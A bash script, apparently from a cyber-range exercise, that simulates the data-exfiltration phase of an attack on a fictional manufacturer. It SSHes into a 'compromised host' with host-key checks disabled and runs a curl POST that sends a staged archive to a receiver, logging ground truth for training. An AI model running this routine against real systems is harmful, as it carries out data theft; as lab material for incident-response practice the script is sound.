#!/bin/bash

# ============================================================
# Nordic Manufacturing A/S - Attack Simulation
# Phase 06 - Data Exfiltration
#
# Purpose:
#   Simulate exfiltration of the synthetic archive created
#   during Phase 05.
#
# Flow:
#
#   IncidentVM
#       |
#       | SSH control
#       v
#   Compromised Host
#       |
#       | HTTP POST
#       | nordic-data.tar.gz
#       v
#   IncidentVM : 8088
#       |
#       v
#   sink.py
#
# IMPORTANT:
#   Only synthetic CyberLab data is transferred.
# ============================================================

set -u

BASE_DIR="/opt/nordic-attack"
LOG_DIR="$BASE_DIR/logs"

mkdir -p "$LOG_DIR"

TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
LOGFILE="$LOG_DIR/exfil-$TIMESTAMP.log"
GROUNDTRUTH="$LOG_DIR/incident-ground-truth.log"

REMOTE_ARCHIVE="/tmp/.cache-update/nordic-data.tar.gz"
SINK_PORT="8088"


# ------------------------------------------------------------
# Functions
# ------------------------------------------------------------

log_event() {
    echo "$(date --iso-8601=seconds) | EXFIL | $1" >> "$GROUNDTRUTH"
}

banner() {
    clear
    echo "============================================================"
    echo "      NORDIC MANUFACTURING - DATA EXFILTRATION"
    echo "============================================================"
    echo
}

validate_ipv4() {

    local IP="$1"

    if ! [[ "$IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        return 1
    fi

    IFS='.' read -r o1 o2 o3 o4 <<< "$IP"

    for octet in "$o1" "$o2" "$o3" "$o4"; do
        if (( octet < 0 || octet > 255 )); then
            return 1
        fi
    done

    return 0
}


# ------------------------------------------------------------
# Dependency checks
# ------------------------------------------------------------

if ! command -v sshpass >/dev/null 2>&1; then
    echo "[ERROR] sshpass is not installed."
    exit 1
fi

if [[ ! -f "$BASE_DIR/sink.py" ]]; then
    echo "[ERROR] $BASE_DIR/sink.py not found."
    exit 1
fi


# ------------------------------------------------------------
# Start
# ------------------------------------------------------------

banner

echo "This phase transfers the synthetic archive created"
echo "during Phase 05 from the compromised host to IncidentVM."
echo

read -rp "Compromised host IP: " COMPROMISED_HOST

if ! validate_ipv4 "$COMPROMISED_HOST"; then
    echo
    echo "[ERROR] Invalid compromised host IPv4 address."
    exit 1
fi

echo

read -rp "SSH username: " SSH_USER
read -rsp "SSH password: " SSH_PASSWORD

echo
echo

read -rp "IncidentVM IP: " INCIDENT_IP

if ! validate_ipv4 "$INCIDENT_IP"; then
    echo
    echo "[ERROR] Invalid IncidentVM IPv4 address."
    exit 1
fi


echo
echo "Exfiltration path:"
echo
echo "  $COMPROMISED_HOST"
echo "       |"
echo "       | HTTP POST"
echo "       v"
echo "  $INCIDENT_IP:$SINK_PORT"
echo


# ------------------------------------------------------------
# Verify archive exists
# ------------------------------------------------------------

echo "[1/4] Checking staged archive..."

log_event "Checking staged archive on $COMPROMISED_HOST"


sshpass -p "$SSH_PASSWORD" \
    ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=5 \
    "$SSH_USER@$COMPROMISED_HOST" \
    "test -f '$REMOTE_ARCHIVE' && stat -c '%n | %s bytes' '$REMOTE_ARCHIVE'" \
    >> "$LOGFILE" 2>&1

CHECK_RESULT=$?


if [[ "$CHECK_RESULT" -ne 0 ]]; then

    echo
    echo "[ERROR] Staged archive was not found."
    echo
    echo "Run 05-staging.sh first."

    log_event "Exfiltration aborted - archive not found on $COMPROMISED_HOST"

    exit 1
fi

echo "      Archive found."


# ------------------------------------------------------------
# Start sink.py
# ------------------------------------------------------------

echo
echo "[2/4] Starting exfiltration receiver on IncidentVM..."

mkdir -p "$BASE_DIR/uploads"

# Stop an old Nordic sink if one is still running
if [[ -f "$BASE_DIR/data/sink.pid" ]]; then

    OLD_PID=$(cat "$BASE_DIR/data/sink.pid" 2>/dev/null || true)

    if [[ "$OLD_PID" =~ ^[0-9]+$ ]] && kill -0 "$OLD_PID" 2>/dev/null; then
        kill "$OLD_PID" 2>/dev/null || true
        sleep 1
    fi

fi


python3 "$BASE_DIR/sink.py" \
    --port "$SINK_PORT" \
    --output "$BASE_DIR/uploads" \
    >> "$LOGFILE" 2>&1 &

SINK_PID=$!

echo "$SINK_PID" > "$BASE_DIR/data/sink.pid"

sleep 2


if ! kill -0 "$SINK_PID" 2>/dev/null; then

    echo
    echo "[ERROR] sink.py failed to start."

    log_event "Exfiltration receiver failed to start"

    exit 1
fi


log_event "Exfiltration receiver started on $INCIDENT_IP:$SINK_PORT"

echo "      Receiver running."


# ------------------------------------------------------------
# Perform exfiltration
# ------------------------------------------------------------

echo
echo "[3/4] Exfiltrating staged archive..."

log_event "Exfiltration started from $COMPROMISED_HOST to $INCIDENT_IP:$SINK_PORT"


REMOTE_COMMAND=$(cat <<EOF

echo "===== DATA EXFILTRATION ====="

echo

echo "[TIME]"
date --iso-8601=seconds

echo

echo "[ARCHIVE]"
ls -lh "$REMOTE_ARCHIVE"

echo

echo "[SHA256]"
sha256sum "$REMOTE_ARCHIVE"

echo

echo "[DESTINATION]"
echo "$INCIDENT_IP:$SINK_PORT"

echo

echo "[TRANSFER]"

curl \
    --connect-timeout 5 \
    --max-time 30 \
    -X POST \
    -H "Content-Type: application/octet-stream" \
    -H "X-Nordic-Filename: nordic-data.tar.gz" \
    --data-binary @"$REMOTE_ARCHIVE" \
    "http://$INCIDENT_IP:$SINK_PORT/upload"

echo

echo "===== EXFILTRATION COMPLETE ====="

EOF
)


sshpass -p "$SSH_PASSWORD" \
    ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o ConnectTimeout=5 \
    "$SSH_USER@$COMPROMISED_HOST" \
    "$REMOTE_COMMAND" >> "$LOGFILE" 2>&1

TRANSFER_RESULT=$?


# ------------------------------------------------------------
# Stop receiver
# ------------------------------------------------------------

sleep 2

echo
echo "[4/4] Stopping exfiltration receiver..."

if kill -0 "$SINK_PID" 2>/dev/null; then
    kill "$SINK_PID" 2>/dev/null || true
    wait "$SINK_PID" 2>/dev/null || true
fi

rm -f "$BASE_DIR/data/sink.pid"


# ------------------------------------------------------------
# Verify result
# ------------------------------------------------------------

if [[ "$TRANSFER_RESULT" -ne 0 ]]; then

    echo
    echo "[ERROR] Exfiltration failed."

    log_event "Exfiltration FAILED from $COMPROMISED_HOST"

    exit 1
fi


RECEIVED_FILE=$(find "$BASE_DIR/uploads" \
    -type f \
    -name "*nordic-data.tar.gz" \
    -printf '%T@ %p\n' 2>/dev/null \
    | sort -nr \
    | head -1 \
    | cut -d' ' -f2-)


if [[ -n "$RECEIVED_FILE" && -f "$RECEIVED_FILE" ]]; then

    SIZE=$(stat -c %s "$RECEIVED_FILE")
    HASH=$(sha256sum "$RECEIVED_FILE" | awk '{print $1}')

    log_event "Exfiltration successful - received $SIZE bytes"
    log_event "Received archive SHA256: $HASH"

    echo
    echo "[+] Exfiltration successful."
    echo
    echo "Received:"
    echo "  $RECEIVED_FILE"
    echo
    echo "Size:"
    echo "  $SIZE bytes"
    echo
    echo "SHA256:"
    echo "  $HASH"

else

    echo
    echo "[WARNING] Transfer command completed but received"
    echo "          archive could not be verified."

    log_event "Transfer completed but received archive could not be verified"

fi


# ------------------------------------------------------------
# Finish
# ------------------------------------------------------------

log_event "Exfiltration phase completed"


echo
echo "============================================================"
echo " Data exfiltration simulation completed"
echo "============================================================"
echo
echo "Source:"
echo "  $COMPROMISED_HOST"
echo
echo "Destination:"
echo "  $INCIDENT_IP:$SINK_PORT"
echo
echo "Attack log:"
echo "  $LOGFILE"
echo
echo "Ground truth:"
echo "  $GROUNDTRUTH"
echo